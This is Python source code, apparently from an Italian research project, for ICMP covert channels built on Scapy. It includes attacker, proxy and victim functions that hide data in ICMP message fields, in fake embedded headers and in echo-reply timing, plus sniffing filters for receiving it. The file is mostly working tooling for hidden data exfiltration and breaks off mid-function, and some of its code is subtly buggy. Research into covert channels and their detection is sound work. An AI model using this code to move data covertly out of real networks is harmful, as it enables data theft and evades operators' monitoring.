import sys 
import datetime
import time
import os
import ipaddress
import string 
from mymethods import *  

from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send, srp1

#----------------------------------------------------------------------- 
def timeout_timing_covertchannel(event_pktconn): 
        THREADING_EVENT.set(event_pktconn)
        return 

def choose_attack_function():  
    singleton=AttackType()
    dict_to_check=singleton.attack_dict 
    result_input=True
    while True: 
        print_dictionary(dict_to_check)
        msg="Scegli il nome o il codice della funzione:\t"
        try:
            scelta=str(input(msg)).lower().strip()
        except Exception as e:
            print(f"choose_attack_function: {e}")
        print("Hai digitato: ",scelta if str(scelta)!="" else "<empty>") 
        func_trovate={}
        for key,value in dict_to_check.items(): 
            if scelta in key or scelta in value: 
                func_trovate[key]=value 
        if len(func_trovate)==1:
            print("Funzione scelta: ", next(iter(func_trovate.items())))
            return next(iter(func_trovate.items()))
        elif len(func_trovate)<1:
            msg="Nessuna funzione trovata. Si vuole continuare? S/N\t" 
            result_input=str(input(msg)).lower().strip()
            dict_to_check=singleton.attack_dict
        elif len(func_trovate)>1: 
            msg="Mutliple funzioni trovate. Si vuole continuare? S/N\t" 
            result_input=str(input(msg)).lower().strip() 
            dict_to_check=func_trovate 
        else:
            raise Exception(f"Unknown case with len(func_trovate): {len(func_trovate)}")
        if not is_scelta_SI_NO(result_input):
            print("Si è scelto di non continuare")
            return None 

def get_filter_attack_from_function(self,function_name:str=None, ip_dst=None, checksum=None): 
    if not isinstance(function_name,str) or not IS_TYPE.ipaddress(ip_dst) or not IS_TYPE.integer(checksum):
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    if self.attack_dict.get(function_name) is None:
        raise ValueError(f"La funzione non è presente: {function_name}")
    print("function_name: ", function_name)
    match function_name:
        case "ipv4_destination_unreachable": 
            TYPE_DESTINATION_UNREACHABLE=3 
            return f"icmp and (icmp[0]=={TYPE_DESTINATION_UNREACHABLE})" #and dst {ip_host}" 
        case "ipv4_source_quench": 
            TYPE_SOURCE_QUENCH=4  
            return f"icmp and (icmp[0]=={TYPE_SOURCE_QUENCH})" # and dst {ip_host}" 
        case "ipv4_redirect": 
            TYPE_REDIRECT=5
            return f"icmp and (icmp[0]=={TYPE_REDIRECT})" # and dst {ip_host}" 
        case "ipv4_timing_channel_1bit" | "ipv4_timing_channel_2bit" | "ipv4_timing_channel_4bit":
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            return f"icmp and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY})" # and dst {ip_host}"  
        case "ipv4_time_exceeded": 
            TYPE_TIME_EXCEEDED=11
            return f"icmp and (icmp[0]=={TYPE_TIME_EXCEEDED})" # and dst {ip_host}"
        case "ipv4_parameter_problem": 
            TYPE_PARAMETER_PROBLEM=12  
            return f"icmp and (icmp[0]=={TYPE_PARAMETER_PROBLEM})" # and dst {ip_host}" 
        case "ipv4_timestamp_request" | "ipv4_timestamp_reply": 
            TYPE_TIMESTAMP_REQUEST=13
            TYPE_TIMESTAMP_REPLY=14
            return f"icmp and (icmp[0]=={TYPE_TIMESTAMP_REQUEST} or icmp[0]=={TYPE_TIMESTAMP_REPLY})" # and dst {ip_host}" 
        case "ipv4_information_request" | "ipv4_information_reply": 
            TYPE_INFORMATION_REQUEST=15
            TYPE_INFORMATION_REPLY=16
            return f"icmp and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})" # and dst {ip_host}"
        #------------------------------------
        case "ipv6_destination_unreachable": 
            TYPE_DESTINATION_UNREACHABLE=1 
            return f"icmp6 and (icmp6[0]=={TYPE_DESTINATION_UNREACHABLE})"# and dst {ip_host.compressed}" 
        case "ipv6_packet_to_big": 
            TYPE_PKT_BIG= 2
            return f"icmp6 and (icmp6[0]=={TYPE_PKT_BIG})"# and dst {ip_host.compressed}" 
        case "ipv6_time_exceeded": 
            TYPE_TIME_EXCEEDED=3  
            return f"icmp6 and (icmp6[0]=={TYPE_TIME_EXCEEDED})"# and dst {ip_host.compressed}" 
        case "ipv6_parameter_problem": 
            TYPE_PARAMETER_PROBLEM=4  
            return f"icmp6 and (icmp6[0]=={TYPE_PARAMETER_PROBLEM})"# and dst {ip_host.compressed}" 
        case "ipv6_timing_channel_1bit" | "ipv6_timing_channel_2bit" | "ipv6_timing_channel_4bit": 
            TYPE_ECHO_REQUEST=128
            TYPE_ECHO_REPLY=129
            return f"icmp6 and (icmp6[0]=={TYPE_ECHO_REQUEST} or icmp6[0]=={TYPE_ECHO_REPLY})"# and dst {ip_host.compressed}"  
        case "ipv6_information_request" | "ipv6_information_reply": 
            TYPE_ECHO_REQUEST=128
            TYPE_ECHO_REPLY=129 
            return f"icmp6 and (icmp6[0]=={TYPE_ECHO_REQUEST} or icmp6[0]=={TYPE_ECHO_REPLY})" # and dst {ip_host}"   

def get_filter_connection_from_function(function_name:str=None, ip_src=None, checksum:int=None, ip_dst=None, interface=None): 
    IPv4_ECHO_REQUEST_TYPE=8
    IPv4_ECHO_REPLY_TYPE=0
    IPv6_ECHO_REQUEST_TYPE=128
    IPv6_ECHO_REPLY_TYPE=129 
    if not isinstance(function_name,str):
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    match function_name:
        #---------------------
        case "wait_conn_from_proxy" | "wait_proxy_update"| "wait_conn_from_victim": 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            elif ip_src.version==6:
                return f"icmp6 and (icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_data_from_proxy" | "wait_conn_from_attacker" | "wait_command_from_attacker": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}")  
        #---------------------
        case "wait_data_from_vicitm":
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")

            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}") 
        #---------------------
        case "wait_conn_from_proxy":
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}") 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]==8 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_attacker_command"| "victim_wait_conn_from_proxy" | "wait_icmpEcho_dst": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]=={IPv4_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        #case "":
        #    if ip_src.version==4:
        #        return aaa
        #    elif ip_src.version==6:
        #        return aaa
        #    else: print(f"Caso non contemplato: {ip_src.version}") 

#-----------------------------------------------------------------------
def send_data(attack_function:dict, data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
    if not (IS_TYPE.dictionary(attack_function) and IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)): 
        raise Exception("send_data: Argomenti non validi")
    print(f"Using {attack_function} as attack function for {ip_dst.compressed}. Sending data: {data}")
    singleton=SendSingleton() 
    attack_code=next(iter(attack_function.items()))[0]
    match attack_code:
        case "ipv4_1"|"ipv4_destination_unreachable": return singleton.ipv4_destination_unreachable(data,ip_dst)
        case "ipv4_2"|"ipv4_source_quench": return singleton.ipv4_source_quench(data,ip_dst)
        case "ipv4_3"|"ipv4_redirect": return singleton.ipv4_redirect(data,ip_dst) 
        case "ipv4_4"|"ipv4_timing_channel_1bit": return singleton.ipv4_timing_channel_1bit(data,ip_dst)
        case "ipv4_5"|"ipv4_timing_channel_2bit": return singleton.ipv4_timing_channel_2bit(data,ip_dst)
        case "ipv4_6"|"ipv4_timing_channel_4bit": return singleton.ipv4_timing_channel_4bit(data,ip_dst)
        case "ipv4_7"|"ipv4_time_exceeded": return singleton.ipv4_time_exceeded(data,ip_dst)
        case "ipv4_8"|"ipv4_parameter_problem": return singleton.ipv4_parameter_problem(data,ip_dst)   
        case "ipv4_10"|"ipv4_timestamp_reply"|"ipv4_9"|"ipv4_timestamp_request": return singleton.ipv4_timestamp_reply(data,ip_dst)
        case "ipv4_12"|"ipv4_information_reply"|"ipv4_11"|"ipv4_information_request": return singleton.ipv4_information_reply(data,ip_dst)
        
        case "ipv6_1"|"ipv6_destination_unreachable": return singleton.ipv6_destination_unreachable(data,ip_dst)
        case "ipv6_2"|"ipv6_packet_to_big": return singleton.ipv6_packet_to_big(data,ip_dst)
        case "ipv6_3"|"ipv6_time_exceeded": return singleton.ipv6_time_exceeded(data,ip_dst) 
        case "ipv6_4"|"ipv6_parameter_problem": return singleton.ipv6_parameter_problem(data,ip_dst)
        case "ipv6_5"|"ipv6_timing_channel_1bit": return singleton.ipv6_timing_channel_1bit(data,ip_dst)
        case "ipv6_6"|"ipv6_timing_channel_2bit": return singleton.ipv6_timing_channel_2bit(data,ip_dst)
        case "ipv6_7"|"ipv6_timing_channel_4bit": return singleton.ipv6_timing_channel_4bit(data,ip_dst)
        case "ipv6_9"|"ipv6_information_reply"|"ipv6_8"|"ipv6_information_request": return singleton.ipv6_information_reply(data,ip_dst)
    print("Caso non contemplato")
    return None

class SendSingleton(): 
    def ipv4_information_reply(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argomenti non corretti")
        if ip_dst.version!=4:
            raise Exception(f"IP version is not 4: {ip_dst.version}") 
        TYPE_INFORMATION_REQUEST=15
        TYPE_INFORMATION_REPLY=16
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst)         
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_INFORMATION_REPLY,id=icmp_id)
            pkt.summary()
            #pkt.show()
            #ans = srp1(pkt, verbose=1, iface=interface)  usando le replynon ritoranno niente
            sendp(pkt, verbose=1, iface=interface) 
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_INFORMATION_REPLY,id=0,seq=1)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
    
    def ipv4_timestamp_reply(data:bytes=None, ip_dst:ipaddress.IPv4Address=None):
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_TIMESTAMP_REQUEST=13 
        TYPE_TIMESTAMP_REPLY=14 
        for index in range(0, len(data), 5): 
            try:
                icmp_id=icmp_id=(data[index]<<8)+data[index+1]  
            except IndexError as e: 
                icmp_id=(data[index]<<8)
            
            current_time=datetime.datetime.now(datetime.timezone.utc) 
            midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

            data_pkt=int.from_bytes(data[index+2:index+3]) *10**3
            current_time=current_time.replace(microsecond=data_pkt)
            icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
            #icmp_ts_ori= int.from_bytes(data[index+2:index+5])  #(ms_since_midnight << 24) |  

            data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
            
            data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000)  

            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(
                type=TYPE_TIMESTAMP_REPLY
                ,id=icmp_id
                ,ts_ori=icmp_ts_ori
                ,ts_rx=icmp_ts_rx
                ,ts_tx=icmp_ts_tx
            )
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface)  
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_TIMESTAMP_REPLY,id=0,seq=1)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
    
    def ipv4_echo_reply(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argomenti non corretti")
        if ip_dst.version!=4:
            raise Exception(f"IP version is not 4: {ip_dst.version}") 
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst)         
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY,id=icmp_id)
            pkt.summary()
            #pkt.show()
            #ans = srp1(pkt, verbose=1, iface=interface)  usando le replynon ritoranno niente
            sendp(pkt, verbose=1, iface=interface) 
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY,id=0,seq=1)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 

    def ipv4_redirect(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_REDIRECT=5    
        for index in range(0, len(data), 4): 
            #icmp_id=(data[index]<<8)+data[index+1]
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index:index+2])) / \
                ICMP(id=int.from_bytes(data[index+2:index+4]))
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_REDIRECT)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_REDIRECT)/Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
    
    def ipv4_source_quench(data:bytes=None, ip_dst:ipaddress.IPv4Address=None):
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_SOURCE_QUENCH=4 
        for index in range(0, len(data), 8):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                ICMP(id=int.from_bytes(data[index+6:index+8]))
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                ICMP(type=TYPE_SOURCE_QUENCH, unused=int.from_bytes(data[index:index+4]))/\
                Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_SOURCE_QUENCH)/Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface)  
    
    def ipv4_parameter_problem(data:bytes=None, ip_dst:ipaddress.IPv4Address=None):
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argomenti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        print(f"START sending to {ip_dst}: {data}")
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_PARAMETER_PROBLEM=12 
        for index in range(0, len(data), 7): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+3:index+5])) / \
                ICMP(id=int.from_bytes(data[index+5:index+7]))
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                ICMP(type=TYPE_PARAMETER_PROBLEM, ptr=int(data[index]) ,unused=int.from_bytes(data[index+1:index+3]) )/\
                Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) #iface=interface
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_PARAMETER_PROBLEM)/Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
        print("END data has being sent using ICMP Parameter Problem")  
    
    def ipv4_time_exceeded(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti") 
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_TIME_EXCEEDED=11 
        for index in range(0, len(data), 6):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+2:index+4])) / \
                ICMP(id=int.from_bytes(data[index+4:index+6]))
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                ICMP(type=TYPE_TIME_EXCEEDED, unused=int.from_bytes(data[index:index+2]) )/\
                Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_TIME_EXCEEDED)/Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
    
    def ipv4_destination_unreachable(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)): 
            raise Exception(f"Argomenti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TYPE_DESTINATION_UNREACHABLE=3 
        for index in range(0, len(data), 8):
            dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                ICMP(id=int.from_bytes(data[index+6:index+8]))
            pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3, unused=int.from_bytes(data[index:index+4]) )/\
                Raw(load=bytes(dummy_ip)[:28]) 
            print(f"Data: {data[index:index+4]}\t{int.from_bytes(data[index:index+4])}")
            print(f"Data: {data[index+4:index+6]}\t{int.from_bytes(data[index+4:index+6])}") 
            print(f"Data: {data[index+6:index+8]}\t{int.from_bytes(data[index+6:index+8])}") 
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface)  if pkt else print("Pacchetto non presente")
        dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
            ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
            Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show()
        print(f"interface: {interface}")
        sendp(pkt, verbose=1, iface=interface) 
    
    def ipv4_timing_channel_1bit(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): #Exec Time 0:08:33.962674
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        TEMPO_0=3 #sec
        DISTANZA_TEMPI=2 #sec
        TEMPO_1=8 #sec
        if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
            raise ValueError("send_timing_cc: TEMPO_1 non valido")
        TEMPO_BYTE=0*60 #minuti
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)

        bit_data=[]
        for piece_data in data: #byte aggiunti in BIG ENDIAN 
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #bit aggiunti in LSB 
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
        start_time=datetime.datetime.now(datetime.timezone.utc) 
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
        for piece_bit_data in bit_data:
            for bit in piece_bit_data:
                if bit: 
                    time.sleep(TEMPO_1) 
                else: 
                    time.sleep(TEMPO_0)
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=interface) 
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 
    
    def ipv4_timing_channel_2bit(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): #Exec Time 0:07:20.978946
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
        #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
        TEMPO_BYTE=0*60 #minuti 
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)

        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface) 
        for piece_bit_data in bit_data:
            for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
                time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=interface)  
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 
    
    def ipv4_timing_channel_4bit(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): #Exec Time 0:12:00.745110 
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
            raise Exception(f"Argoemnti non corretti")
        if ip_dst.version!=4:
            print(f"IP version is not 4: {ip_dst.version}")
            return False
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"Interfaccia per destinazione: {interface}")
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
        TEMPO_BYTE=0*60 #minuti  
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        
        bit_data=[]
